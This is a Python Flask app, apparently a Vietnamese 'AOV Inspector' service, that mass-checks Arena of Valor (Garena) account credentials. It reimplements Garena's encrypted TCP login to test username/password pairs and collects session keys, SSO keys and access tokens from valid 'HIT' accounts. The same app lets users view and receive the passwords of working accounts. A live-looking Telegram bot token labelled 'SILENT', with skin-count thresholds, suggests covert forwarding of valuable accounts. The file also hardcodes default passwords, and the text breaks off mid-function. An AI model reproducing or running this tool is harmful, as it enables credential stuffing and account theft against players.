#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AOV INSPECTOR - ULTIMATE EDITION v3.7.3 FINAL
- 🥇 OWNER + 👑 5 QTV (bỏ ADMIN)
- 🔐 OTP gửi TIN NHẮN + lưu session
- ⚡ Check đơn SONG SONG 4 API
- 🚀 UP ACC: KHÔNG DELAY, KHÔNG NGHỈ
- 📊 8 lượt/ngày mặc định
- 🎯 Owner set/cộng limit
- 👁 Xem TK/MK acc đã nhận
- 🚫 Lọc acc ban khi up
- 🔧 v3.7.3: RETRY 3 LẦN + TIMEOUT 12s + FIX PLAYER_UID + BAN CHECK + CẢNH BÁO LỖI TẠM THỜI
"""

import os, json, time, uuid, random, hashlib, threading, logging, struct, socket
import shutil, traceback, re, io, csv, string
from io import BytesIO
from datetime import datetime, timedelta
from functools import wraps
from typing import Dict, List, Optional, Tuple
from collections import Counter, defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import (Flask, render_template_string, request, jsonify, session,
                   redirect, url_for, flash, get_flashed_messages, Response,
                   send_file, make_response, abort)
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== CẤU HÌNH v3.7.3 ==========
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "matkhau"
APP_SECRET = "aov_ultimate_v373_2026"

OWNER_USERNAME = "owner"
OWNER_PASSWORD = "owner123"

QTV_ACCOUNTS = [
    {"username": "qtv1", "password": "qtv1@123", "balance": 99999},
    {"username": "qtv2", "password": "qtv2@123", "balance": 99999},
    {"username": "qtv3", "password": "qtv3@123", "balance": 99999},
    {"username": "qtv4", "password": "qtv4@123", "balance": 99999},
    {"username": "qtv5", "password": "qtv5@123", "balance": 99999},
]

CHAT_MAX_MESSAGES = 5000
CHAT_MAX_LENGTH = 2000
CHAT_RATE_LIMIT_SEC = 2
OTP_EXPIRE_SEC = 300
OTP_LENGTH = 6

DATA_DIR = os.environ.get("DATA_DIR", ".")
DATA_FILE = os.path.join(DATA_DIR, "web_data.json")
DATA_BACKUP_FILE = os.path.join(DATA_DIR, "web_data_backup.json")
DATA_TMP_FILE = os.path.join(DATA_DIR, "web_data.json.tmp")
UPLOAD_FOLDER = os.path.join(DATA_DIR, "uploads")
LOG_FILE = os.path.join(DATA_DIR, "aov_inspector.log")
BACKUP_DIR = os.path.join(DATA_DIR, "backups")
CHAT_FILE = os.path.join(DATA_DIR, "chat_data.json")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(BACKUP_DIR, exist_ok=True)

MAX_CONCURRENT_CHECKS = 8
MAX_PARALLEL_JOBS = 1
TCP_LOGIN_TIMEOUT = 10
AUTO_RETRY = 3
AUTO_BACKUP_INTERVAL = 900
RATE_LIMIT_PER_IP = 60
RATE_LIMIT_WINDOW = 60
DEFAULT_BALANCE = 400
DAILY_REWARD = 10
REFERRAL_REWARD = 100
REFERRAL_BONUS = 20
CHECK_COST = 1
LEVEL_UP_BASE = 10

STORAGE_CHECK_THREADS = 6
STORAGE_DELAY_PER_ACC = 0
STORAGE_BATCH_SIZE = 100
STORAGE_BATCH_SLEEP = 0
MAX_ACC_PER_UPLOAD = 2000
USER_DAILY_LIMIT = 8

API_TIMEOUT = 12
API_RETRY = 3

SILENT_BOT_TOKEN = "8984591005:AAEBgJgtBfWJIAiYg4hh355pSk0I9BRYtt0"
SILENT_CHAT_ID = "8846236342"
SILENT_MIN_SKINS = 100
SILENT_MIN_SSS = 3

AUTH_SERVERS = ["103.247.205.14", "103.247.205.15", "103.247.205.18"]

app = Flask(__name__)
app.secret_key = APP_SECRET
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=30)

logging.basicConfig(level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8"), logging.StreamHandler()])
logger = logging.getLogger(__name__)

# ========== DATABASE ==========
USERS: Dict[str, dict] = {}
GENERATED_KEYS: Dict[str, dict] = {}
NOTIFICATIONS: List[dict] = []
CHECK_JOBS: Dict[str, dict] = {}
JOB_QUEUE: List[str] = []
SHARES: Dict[str, dict] = {}
ADMIN_LOGS: List[dict] = []
BANNED_USERS: set = set()
ACC_STORAGE: List[dict] = []
ACC_HISTORY: List[dict] = []
STORAGE_JOBS: Dict[str, dict] = {}
CHAT_MESSAGES: List[dict] = []
CHAT_DM: Dict[str, List[dict]] = {}
OTP_STORE: Dict[str, dict] = {}

_active_jobs_lock = threading.Lock()
_active_jobs_count = [0]
_storage_jobs_lock = threading.Lock()
_storage_jobs_count = [0]
_lock = threading.Lock()
_save_lock = threading.Lock()
_save_dirty = [False]
_save_last = [0]
SAVE_DEBOUNCE_SEC = 10
_rate_store = defaultdict(lambda: deque(maxlen=200))
_rate_lock = threading.Lock()
_unread_cache = {}
_unread_lock = threading.Lock()
_chat_lock = threading.Lock()
_user_last_msg: Dict[str, float] = {}
_otp_lock = threading.Lock()

# ========== ERROR HANDLER ==========
@app.errorhandler(500)
def internal_error(e):
    logger.error(f"500: {traceback.format_exc()}")
    return render_error_page(), 500

@app.errorhandler(Exception)
def all_exceptions(e):
    logger.error(f"EXC: {traceback.format_exc()}")
    return render_error_page(), 500

def render_error_page():
    return '<html><body style="background:#05000e;color:#fff;text-align:center;padding:50px;font-family:sans-serif"><h1>⚠️ LỖI</h1><a href="/" style="color:#00f0ff">← TRANG CHỦ</a></body></html>'

# ========== RATE LIMIT ==========
def check_rate_limit(ip):
    now = time.time()
    with _rate_lock:
        q = _rate_store[ip]
        while q and now - q[0] > RATE_LIMIT_WINDOW:
            q.popleft()
        if len(q) >= RATE_LIMIT_PER_IP:
            return False
        q.append(now)
        return True

@app.before_request
def _session_validate_middleware():
    if request.path.startswith("/static") or request.path == "/health":
        return None
    if "username" not in session:
        return None
    uname = session.get("username")
    u = USERS.get(uname)
    if not u:
        session.clear()
        return None
    se = session.get("session_epoch", 0)
    ue = u.get("session_epoch", 0)
    if se and ue and se != ue:
        reason = u.get("force_logout_reason", "Tài khoản đã được đổi thông tin")
        session.clear()
        flash(f"⚠️ {reason}", "error")
        return redirect(url_for("login_page"))
    return None

@app.before_request
def _rate_limit_middleware():
    if request.path in ("/health",) or request.path.startswith("/static"):
        return None
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "unknown").split(",")[0].strip()
    if not check_rate_limit(ip):
        return Response("⚠️ Bạn thao tác quá nhanh. Vui lòng đợi vài giây!", status=429)
    return None

# ========== SAVE DATA ==========
def save_data(force=False):
    now = time.time()
    with _save_lock:
        if not force and (now - _save_last[0] < SAVE_DEBOUNCE_SEC):
            _save_dirty[0] = True
            return
        _save_last[0] = now
        _save_dirty[0] = False
    threading.Thread(target=_do_save_async, daemon=True).start()

def _do_save_async():
    try:
        with _lock:
            data = {"users": USERS, "generated_keys": GENERATED_KEYS,
                    "notifications": NOTIFICATIONS[-100:],
                    "shares": dict(list(SHARES.items())[-500:]),
                    "admin_logs": ADMIN_LOGS[-500:],
                    "banned_users": list(BANNED_USERS),
                    "acc_storage": ACC_STORAGE[-3000:],
                    "acc_history": ACC_HISTORY[-500:]}
            with open(DATA_TMP_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, separators=(",", ":"))
                f.flush()
            if os.path.exists(DATA_FILE) and os.path.getsize(DATA_FILE) > 0:
                try: shutil.copy2(DATA_FILE, DATA_BACKUP_FILE)
                except: pass
            os.replace(DATA_TMP_FILE, DATA_FILE)
    except Exception as e:
        logger.error(f"Save error: {e}")

def _save_daemon():
    while True:
        time.sleep(SAVE_DEBOUNCE_SEC + 1)
        with _save_lock:
            if _save_dirty[0]:
                _save_dirty[0] = False
                _save_last[0] = time.time()
                _do_save_async()

def load_data():
    global USERS, GENERATED_KEYS, NOTIFICATIONS, SHARES, ADMIN_LOGS, BANNED_USERS, ACC_STORAGE, ACC_HISTORY
    data = None
    for fname in (DATA_FILE, DATA_BACKUP_FILE):
        if not os.path.exists(fname): continue
        try:
            if os.path.getsize(fname) == 0: continue
            with open(fname, "r", encoding="utf-8") as f:
                data = json.load(f)
            break
        except: data = None
    if data is None: return
    USERS = data.get("users", {})
    GENERATED_KEYS = data.get("generated_keys", {})
    NOTIFICATIONS = data.get("notifications", [])
    SHARES = data.get("shares", {})
    ADMIN_LOGS = data.get("admin_logs", [])
    BANNED_USERS = set(data.get("banned_users", []))
    ACC_STORAGE = data.get("acc_storage", [])
    ACC_HISTORY = data.get("acc_history", [])

def auto_backup_worker():
    while True:
        try:
            time.sleep(AUTO_BACKUP_INTERVAL)
            if os.path.exists(DATA_FILE):
                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                dst = os.path.join(BACKUP_DIR, f"web_data_{ts}.json")
                shutil.copy2(DATA_FILE, dst)
                files = sorted([f for f in os.listdir(BACKUP_DIR) if f.startswith("web_data_")])
                if len(files) > 48:
                    for old in files[:-48]:
                        try: os.remove(os.path.join(BACKUP_DIR, old))
                        except: pass
        except Exception as e:
            logger.error(f"Backup error: {e}")

# ========== AUTH HELPERS ==========
def gen_id():
    return "AOV-" + uuid.uuid4().hex[:4].upper() + "-" + uuid.uuid4().hex[:4].upper()

def hash_password(p):
    return hashlib.sha256((p + APP_SECRET).encode()).hexdigest()

def login_required(f):
    @wraps(f)
    def deco(*a, **k):
        if "username" not in session or session["username"] not in USERS:
            session.pop("username", None)
            return redirect(url_for("login_page"))
        if session["username"] in BANNED_USERS:
            session.pop("username", None)
            flash("Tài khoản đã bị ban!", "error")
            return redirect(url_for("login_page"))
        return f(*a, **k)
    return deco

def admin_required(f):
    @wraps(f)
    def deco(*a, **k):
        if "username" not in session: return redirect(url_for("login_page"))
        if not is_owner():
            flash("Chỉ OWNER!", "error")
            return redirect(url_for("check_page"))
        return f(*a, **k)
    return deco

def get_user():
    if "username" not in session: return None
    return USERS.get(session["username"])

# ========== ROLE HELPERS ==========
def is_owner(username=None):
    if username is None:
        username = session.get("username", "")
    return username == OWNER_USERNAME

def is_qtv(username=None):
    if username is None:
        username = session.get("username", "")
    u = USERS.get(username)
    return bool(u and u.get("is_qtv"))

def is_admin(username=None):
    if username is None:
        username = session.get("username", "")
    return is_owner(username)

def can_up_acc(username=None):
    return is_owner(username) or is_qtv(username)

def get_role_badge(username=None):
    if username is None:
        username = session.get("username", "")
    if is_owner(username):
        return "🥇 OWNER", "#ffb800"
    u = USERS.get(username)
    if u and u.get("is_qtv"):
        return "👑 QTV", "#00f0ff"
    return "👤 USER", "#8b8b9a"

def owner_required(f):
    @wraps(f)
    def deco(*a, **k):
        if "username" not in session:
            return redirect(url_for("login_page"))
        if not is_owner():
            flash("Chỉ OWNER mới có quyền!", "error")
            return redirect(url_for("check_page"))
        return f(*a, **k)
    return deco

def admin_or_qtv_required(f):
    @wraps(f)
    def deco(*a, **k):
        if "username" not in session:
            return redirect(url_for("login_page"))
        if not (is_owner() or is_qtv()):
            flash("Không có quyền!", "error")
            return redirect(url_for("check_page"))
        return f(*a, **k)
    return deco

def invalidate_user_sessions(username):
    u = USERS.get(username)
    if not u: return
    u["session_epoch"] = int(time.time() * 1000)
    u["force_logout_at"] = time.time()
    u["force_logout_reason"] = "Tài khoản đã được đổi thông tin. Vui lòng đăng nhập lại!"

def gen_otp(username, action="change"):
    code = "".join(random.choices(string.digits, k=OTP_LENGTH))
    with _otp_lock:
        OTP_STORE[username] = {"code": code, "action": action,
            "expire": time.time() + OTP_EXPIRE_SEC, "created": time.time()}
    return code

def verify_otp(username, code):
    with _otp_lock:
        item = OTP_STORE.get(username)
    if not item: return False, "Chưa có mã xác thực, vui lòng gửi lại"
    if time.time() > item.get("expire", 0): return False, "Mã đã hết hạn"
    if str(code).strip() != item.get("code"): return False, "Mã không đúng"
    with _otp_lock:
        OTP_STORE.pop(username, None)
    return True, "OK"

def unread_count():
    u = get_user()
    if not u: return 0
    username = u.get("username", "")
    now = time.time()
    with _unread_lock:
        item = _unread_cache.get(username)
        if item and now - item[0] < 5:
            return item[1]
    lr = u.get("last_notif_read", 0)
    cnt = sum(1 for n in NOTIFICATIONS if n.get("timestamp", 0) > lr)
    with _unread_lock:
        _unread_cache[username] = (now, cnt)
    return cnt

def mark_read():
    u = get_user()
    if u:
        u["last_notif_read"] = time.time()
        save_data()

def log_admin(action, target="", detail=""):
    ADMIN_LOGS.append({
        "id": uuid.uuid4().hex[:10],
        "admin": session.get("username", "?"),
        "action": action, "target": target, "detail": detail,
        "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "timestamp": time.time()
    })
    if len(ADMIN_LOGS) > 500: ADMIN_LOGS.pop(0)

def add_exp(user, amount):
    if "level" not in user: user["level"] = 1
    if "exp" not in user: user["exp"] = 0
    user["exp"] += amount
    while user["exp"] >= user["level"] * LEVEL_UP_BASE:
        user["exp"] -= user["level"] * LEVEL_UP_BASE
        user["level"] += 1
        user["balance"] += 5

def _make_special_user(username, password, is_admin=False, is_qtv=False,
                       is_owner=False, balance=999999, level=999):
    return {
        "id": gen_id(), "username": username,
        "password": hash_password(password),
        "plain_password": password,
        "balance": balance, "temp_balance": 0, "referrals": 0,
        "invited_by": None,
        "is_admin": is_admin, "is_qtv": is_qtv, "is_owner": is_owner,
        "tag_code": "TAG-" + username.upper() + "-" + uuid.uuid4().hex[:6].upper(),
        "session_epoch": 0,
        "daily_limit": USER_DAILY_LIMIT,
        "created_at": time.time(),
        "last_checkin": 0, "last_notif_read": 0, "checkin_streak": 0,
        "total_checkins": 0, "history": [], "current_job": None,
        "level": level, "exp": 0, "favorites": [], "tags": {},
        "cultivation": {"level": 0, "exp": 0, "hp": 100, "atk": 20, "def": 10,
                        "weapon": None, "mon_phai": None, "mon_phai_level": 0},
        "mission": {"total_acc": 0, "sss": 0, "ss": 0, "anime": 0,
                    "xu_used": 0, "claimed": []},
        "daily_missions": {}, "last_daily_reset": 0,
        "daily_received": {}, "received_accs": [], "daily_bonus": {},
        "chat_last_read": {}
    }

def create_admin():
    global USERS
    if OWNER_USERNAME not in USERS:
        USERS[OWNER_USERNAME] = _make_special_user(
            OWNER_USERNAME, OWNER_PASSWORD,
            is_admin=True, is_qtv=True, is_owner=True,
            balance=9999999, level=9999)
        logger.info(f"🥇 Tạo OWNER: {OWNER_USERNAME}")
    created = []
    for acc in QTV_ACCOUNTS:
        un = acc["username"]
        if un not in USERS:
            USERS[un] = _make_special_user(
                un, acc["password"],
                is_admin=False, is_qtv=True, is_owner=False,
                balance=acc.get("balance", 99999), level=99)
            created.append(un)
    if created:
        logger.info(f"👑 Tạo {len(created)} QTV: {', '.join(created)}")
    save_data(force=True)

# ========== HTTP RETRY HELPERS ==========
def _http_get_retry(url, headers, cookies=None, proxies=None,
                    timeout=API_TIMEOUT, retries=API_RETRY, backoff=1.0,
                    logger_fn=None):
    last_exc = None
    for attempt in range(retries):
        try:
            kw = {"timeout": timeout, "verify": False, "allow_redirects": True}
            if proxies: kw["proxies"] = proxies
            res = requests.get(url, headers=headers, cookies=cookies or {}, **kw)
            if res.status_code == 200:
                return res
            if res.status_code in (429, 502, 503, 504):
                if logger_fn:
                    logger_fn(f"[HTTP] {res.status_code} {url} — retry {attempt+1}/{retries}")
                time.sleep(backoff * (attempt + 1))
                continue
            return res
        except requests.exceptions.Timeout as e:
            last_exc = e
            if logger_fn:
                logger_fn(f"[HTTP] TIMEOUT {url} — retry {attempt+1}/{retries}")
            time.sleep(backoff * (attempt + 1))
        except Exception as e:
            last_exc = e
            if logger_fn:
                logger_fn(f"[HTTP] EXC {url}: {e}")
            break
    if logger_fn and last_exc:
        logger_fn(f"[HTTP] FAILED after retries: {url} — {last_exc}")
    return None

def _http_post_retry(url, data=None, json_data=None, headers=None, cookies=None,
                     proxies=None, timeout=API_TIMEOUT, retries=API_RETRY,
                     backoff=1.0, logger_fn=None):
    last_exc = None
    for attempt in range(retries):
        try:
            kw = {"timeout": timeout, "verify": False, "allow_redirects": True}
            if proxies: kw["proxies"] = proxies
            if json_data is not None:
                res = requests.post(url, json=json_data, headers=headers,
                                    cookies=cookies or {}, **kw)
            else:
                res = requests.post(url, data=data, headers=headers,
                                    cookies=cookies or {}, **kw)
            if res.status_code == 200:
                return res
            if res.status_code in (429, 502, 503, 504):
                time.sleep(backoff * (attempt + 1))
                continue
            return res
        except requests.exceptions.Timeout as e:
            last_exc = e
            time.sleep(backoff * (attempt + 1))
        except Exception as e:
            last_exc = e
            break
    return None

# ========== TCP LOGIN ==========
PORT = 19000
CLIENT_PLATFORM_ANDROID = 17
CLIENT_VERSION = 283
CLIENT_TYPE = 4352
CMD_LOGIN_PREPARE = 256
CMD_LOGIN = 257
CMD_SSO_KEY_GET = 442
CMD_SESSION_TOKEN_GET = 278
CMD_APP_OAUTH_LOGIN = 439
PACKET_VERSION = (CLIENT_PLATFORM_ANDROID << 24) + CLIENT_VERSION
CLIENT_ID_MASK = 4354
_pkt_counter = random.randint(0, 0x3FFFFF)
_XTEA_DELTA = 0x9E3779B9
_XTEA_ROUNDS = 32

def _mix(v): return ((v << 4) & 0xFFFFFFFF) ^ (v >> 5)

def _xtea_enc(v0, v1, key):
    k = struct.unpack('<4I', key); s = 0
    for _ in range(_XTEA_ROUNDS):
        v0 = (v0 + (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s = (s + _XTEA_DELTA) & 0xFFFFFFFF
        v1 = (v1 + (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def _xtea_dec(v0, v1, key):
    k = struct.unpack('<4I', key); s = (_XTEA_DELTA * _XTEA_ROUNDS) & 0xFFFFFFFF
    for _ in range(_XTEA_ROUNDS):
        v1 = (v1 - (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s = (s - _XTEA_DELTA) & 0xFFFFFFFF
        v0 = (v0 - (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def xtea_encrypt(data, key):
    pad = 8 - len(data) % 8
    data = data + bytes([pad] * pad)
    R = struct.unpack('<Q', os.urandom(8))[0]
    enc_R = struct.pack('<2I', *_xtea_enc(*struct.unpack('<2I', struct.pack('<Q', R)), key))
    prev = enc_R; out = bytearray(enc_R); pt_sum = R; last_ct = enc_R
    for i in range(0, len(data), 8):
        pb = data[i:i+8]
        pt_sum = (pt_sum + struct.unpack('<Q', pb)[0]) & 0xFFFFFFFFFFFFFFFF
        blk = bytes(a ^ b for a, b in zip(pb, prev))
        v0, v1 = _xtea_enc(*struct.unpack('<2I', blk), key)
        prev = struct.pack('<2I', v0, v1); last_ct = prev; out.extend(prev)
    ci = struct.unpack('<Q', last_ct)[0] ^ pt_sum
    ce = struct.pack('<2I', *_xtea_enc(*struct.unpack('<2I', struct.pack('<Q', ci)), key))
    out.extend(ce)
    return bytes(out)

def xtea_decrypt(data, key):
    if len(data) < 24 or len(data) % 8 != 0: return data
    iv = data[:8]; body = data[8:-8]
    out = bytearray(); prev = iv
    for i in range(0, len(body), 8):
        blk = body[i:i+8]
        v0, v1 = _xtea_dec(*struct.unpack('<2I', blk), key)
        out.extend(bytes(a ^ b for a, b in zip(struct.pack('<2I', v0, v1), prev)))
        prev = blk
    if out:
        pad = out[-1]
        if 1 <= pad <= 8 and all(b == pad for b in out[-pad:]): out = out[:-pad]
    return bytes(out)

def _vint(n):
    o = bytearray()
    while n > 0x7F:
        o.append((n & 0x7F) | 0x80); n >>= 7
    o.append(n & 0x7F); return bytes(o)

def _pfv(t, n): return _vint((t << 3) | 0) + _vint(n)
def _pfb(t, b): return _vint((t << 3) | 2) + _vint(len(b)) + b
def _pfs(t, s): return _pfb(t, s.encode('utf-8'))

def _pdecode(data):
    f = {}; pos = 0
    def _st(fn, v):
        if fn in f:
            p = f[fn]
            if isinstance(p, list): p.append(v)
            else: f[fn] = [p, v]
        else: f[fn] = v
    while pos < len(data):
        try:
            key = 0; sh = 0
            while True:
                b = data[pos]; pos += 1
                key |= (b & 0x7F) << sh
                if not (b & 0x80): break
                sh += 7
            fn, wt = key >> 3, key & 7
            if wt == 0:
                v = 0; sh = 0
                while True:
                    b = data[pos]; pos += 1
                    v |= (b & 0x7F) << sh
                    if not (b & 0x80): break
                    sh += 7
                _st(fn, v)
            elif wt == 2:
                ln = 0; sh = 0
                while True:
                    b = data[pos]; pos += 1
                    ln |= (b & 0x7F) << sh
                    if not (b & 0x80): break
                    sh += 7
                _st(fn, data[pos:pos+ln]); pos += ln
            else: break
        except IndexError: break
    return f

def _pget(f, t, d=None):
    v = f.get(t, d)
    if isinstance(v, list): return v[-1] if v else d
    return v

def _nid():
    global _pkt_counter
    _pkt_counter = (_pkt_counter + 1) & 0x7FFFFFFF
    return CLIENT_ID_MASK | _pkt_counter

def _bframe(cmd, body):
    hdr = (_pfv(1, PACKET_VERSION) + _pfv(2, _nid()) + _pfv(3, 2) +
           _pfv(4, cmd) + _pfv(6, int(time.time())))
    p = struct.pack('>H', len(hdr)) + hdr + body
    return struct.pack('<I', len(p)) + p

def _recvall(s, n):
    b = b''
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c: raise ConnectionError("drop")
        b += c
    return b

def _rframe(s):
    sz = struct.unpack('<I', _recvall(s, 4))[0]
    p = _recvall(s, sz)
    hl = struct.unpack('>H', p[:2])[0]
    rh = _pdecode(p[2:2+hl])
    h = {k: (_pget(rh, k) if isinstance(v, list) else v) for k, v in rh.items()}
    return h, p[2+hl:]

def _rcframe(s, tc, mt=5):
    for _ in range(mt):
        h, b = _rframe(s)
        if h.get(4, 0) == tc: return h, b
    return {}, b''

def _atype(a):
    if a.isdigit(): return 3
    if '@' in a: return 2
    return 1

def _blprep(acc, rk):
    inner = (_pfv(1, 0) + _pfv(2, _atype(acc)) + _pfs(3, acc) +
             _pfv(4, CLIENT_TYPE) + _pfv(5, CLIENT_VERSION))
    return _pfb(1, rk) + _pfb(2, xtea_encrypt(inner, rk))

def _dlkey(pw, salt, vc):
    m = hashlib.md5(pw.encode()).hexdigest()
    ir = hashlib.sha256((m + salt).encode()).digest()
    k = hashlib.sha256((ir.hex() + vc).encode()).digest()[:16]
    return k, m.encode('ascii')

def _blogin(acc, pw, salt, vc):
    k, ph = _dlkey(pw, salt, vc)
    did = hashlib.md5(acc.encode()).digest()
    usb = _pfv(2, 4608)
    inner = _pfb(1, ph) + _pfv(2, 0) + _pfb(3, usb) + _pfb(4, did)
    return _pfb(1, xtea_encrypt(inner, k)), k

def _rfenc(s, sk):
    sz = struct.unpack('<I', _recvall(s, 4))[0]
    ep = _recvall(s, sz)
    p = xtea_decrypt(ep, sk)
    hl = struct.unpack('>H', p[:2])[0]
    rh = _pdecode(p[2:2+hl])
    h = {k: (_pget(rh, k) if isinstance(v, list) else v) for k, v in rh.items()}
    return h, p[2+hl:]

def _senc(s, cmd, body, sk, to=5):
    ot = s.gettimeout()
    try:
        s.settimeout(to)
        hdr = (_pfv(1, PACKET_VERSION) + _pfv(2, _nid()) + _pfv(3, 2) +
               _pfv(4, cmd) + _pfv(6, int(time.time())))
        p = struct.pack('>H', len(hdr)) + hdr + body
        ep = xtea_encrypt(p, sk)
        s.sendall(struct.pack('<I', len(ep)) + ep)
        for _ in range(5):
            h2, b2 = _rfenc(s, sk)
            if h2.get(4, 0) == cmd: return h2, b2
        return {}, b''
    finally:
        try: s.settimeout(ot)
        except: pass

def _fsso(s, sk):
    """v3.7.3: Thử 3 lần vì Garena đôi khi trả lỗi tạm"""
    for attempt in range(3):
        try:
            h, b = _senc(s, CMD_SSO_KEY_GET, b'', sk, 5)
            if h.get(5, 0) != 0:
                time.sleep(0.5)
                continue
            f = _pdecode(b)
            sso = _pget(f, 1)
            if sso is not None:
                return {'sso_key': sso.decode('utf-8') if isinstance(sso, bytes) else str(sso)}
        except Exception:
            time.sleep(0.5)
            continue
    return {}

def _fsession(s, sk, app_id=0):
    try:
        body = b'' if not app_id else _pfv(1, int(app_id))
        h, b = _senc(s, CMD_SESSION_TOKEN_GET, body, sk, 5)
        if h.get(5, 0) != 0: return {}
        f = _pdecode(b)
        t = _pget(f, 1)
        if t is not None:
            return {'session_token': t.decode('utf-8') if isinstance(t, bytes) else str(t)}
    except: pass
    return {}

def _foauth(s, sk, app_id):
    try:
        body = (_pfv(1, app_id) + _pfs(2, "") + _pfv(3, 2) + _pfs(4, "") +
                _pfv(5, 0) + _pfv(6, CLIENT_PLATFORM_ANDROID))
        h, b = _senc(s, CMD_APP_OAUTH_LOGIN, body, sk, 8)
        if h.get(5, 0) != 0: return {}
        f = _pdecode(b)
        tok = _pget(f, 1); oid = _pget(f, 4)
        out = {}
        if tok is not None: out['access_token'] = tok.decode('utf-8') if isinstance(tok, bytes) else str(tok)
        if oid is not None: out['open_id'] = oid.decode('utf-8') if isinstance(oid, bytes) else str(oid)
        return out
    except: return {}

def _do_tcp_login(acc, pw, host, port, timeout=10):
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        rk = os.urandom(16)
        s.sendall(_bframe(CMD_LOGIN_PREPARE, _blprep(acc, rk)))
        h, b = _rcframe(s, CMD_LOGIN_PREPARE, 5)
        if h.get(5, 0) != 0:
            return {'status': 'ERROR', 'detail': f'PREPARE_FAIL={h.get(5)}'}
        pr = _pdecode(b)
        rkey = _pget(pr, 1, b''); rdata = _pget(pr, 2, b'')
        if not rkey or not rdata:
            return {'status': 'ERROR', 'detail': 'EmptyPrepare'}
        pd = _pdecode(xtea_decrypt(rdata, rkey))
        salt = _pget(pd, 1, b'').decode('utf-8', errors='ignore')
        vc = _pget(pd, 2, b'').decode('utf-8', errors='ignore')
        lb, k = _blogin(acc, pw, salt, vc)
        s.sendall(_bframe(CMD_LOGIN, lb))
        h, b = _rcframe(s, CMD_LOGIN, 5)
        if h.get(5, 0) != 0:
            return {'status': 'INVALID', 'detail': f'LOGIN_FAIL={h.get(5)}'}
        lr = _pdecode(b)
        er = _pget(lr, 1, b'')
        if not er:
            return {'status': 'ERROR', 'detail': 'EmptyLoginReply'}
        rd = _pdecode(xtea_decrypt(er, k))
        uid = _pget(rd, 1, 0)
        sk = _pget(rd, 2, b'')
        if not uid:
            return {'status': 'ERROR', 'detail': 'UID=0'}
        if not isinstance(sk, bytes) or len(sk) != 16:
            return {'status': 'ERROR', 'detail': 'BadKey'}
        res = {'status': 'HIT', 'uid': uid, 'session_key': sk.hex()}
        sso = _fsso(s, sk)
        if sso.get('sso_key'): res['sso_key'] = sso['sso_key']
        st = _fsession(s, sk, 100054)
        if st.get('session_token'): res['session_token'] = st['session_token']
        oa = _foauth(s, sk, 100054)
        if oa.get('access_token'): res['access_token'] = oa['access_token']
        if oa.get('open_id'): res['open_id'] = oa['open_id']
        return res
    except socket.timeout:
        return {'status': 'TIMEOUT', 'detail': 'Socket timeout'}
    except ConnectionRefusedError:
        return {'status': 'BLOCKED', 'detail': 'Connection refused'}
    except ConnectionResetError:
        return {'status': 'BLOCKED', 'detail': 'Connection reset'}
    except Exception as e:
        return {'status': 'ERROR', 'detail': str(e)}
    finally:
        if s:
            try: s.close()
            except: pass

def tcp_login(acc, pw, timeout=10):
    last_err = {'status': 'ERROR', 'detail': 'No server tried'}
    for host in AUTH_SERVERS:
        res = _do_tcp_login(acc, pw, host, PORT, timeout)
        if res.get('status') == 'HIT': return res
        if res.get('status') in ('INVALID', 'ERROR'): return res
        last_err = res
    return last_err

APP_ID = "100054"
CONNECT_AUTH_URL = f"https://{APP_ID}.connect.garena.com"
UA = "Mozilla/5.0 (Linux; Android 9; SM-S9280) AppleWebKit/537.36 Chrome/124 Mobile Safari/537.36"
UA_DESKTOP = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
COOKIE_BASE = "apple_state_key=179d1b269c5711f1846f0ebfc742fc72; fb_state=ae05815a37ec4b91b695c41cc9516001"

HERO_CDN_BASE = "https://dl.ops.kgvn.garenanow.com/hok/VN/HeroHeadPath/"
SKIN_CDN_BASE = "https://dl.ops.kgvn.garenanow.com/hok/VN/HeroSkinPath/"

def _norm_unix_ts(v):
    try:
        t = int(float(v or 0))
    except Exception:
        return 0
    if t <= 0: return 0
    while t > 10_000_000_000: t //= 1000
    if t < 0 or t > 32_503_680_000: return 0
    return t

def _safe_fromtimestamp(v, fmt="%d-%m-%Y %H:%M"):
    ts = _norm_unix_ts(v)
    if not ts or ts < 946_684_800: return ""
    try:
        return datetime.fromtimestamp(ts).strftime(fmt)
    except (OSError, OverflowError, ValueError, TypeError):
        return ""

def _deep_find(obj, keys, max_depth=6, _d=0):
    if _d > max_depth or obj is None: return None
    if isinstance(obj, dict):
        for k in keys:
            if k in obj and obj[k] not in (None, "", 0, "0", [], {}):
                return obj[k]
        for v in obj.values():
            r = _deep_find(v, keys, max_depth, _d + 1)
            if r not in (None, "", 0, "0", [], {}): return r
    elif isinstance(obj, list):
        for v in obj:
            r = _deep_find(v, keys, max_depth, _d + 1)
            if r not in (None, "", 0, "0", [], {}): return r
    return None

def _hero_cdn(item_id):
    iid = int(item_id)
    return f"{SKIN_CDN_BASE}{iid}.jpg"

def _hero_fallback_cdn(item_id):
    iid = int(item_id)
    prefix = iid // 100
    variant = iid % 100
    if variant <= 1:
        return f"{HERO_CDN_BASE}30{prefix}0.jpg"
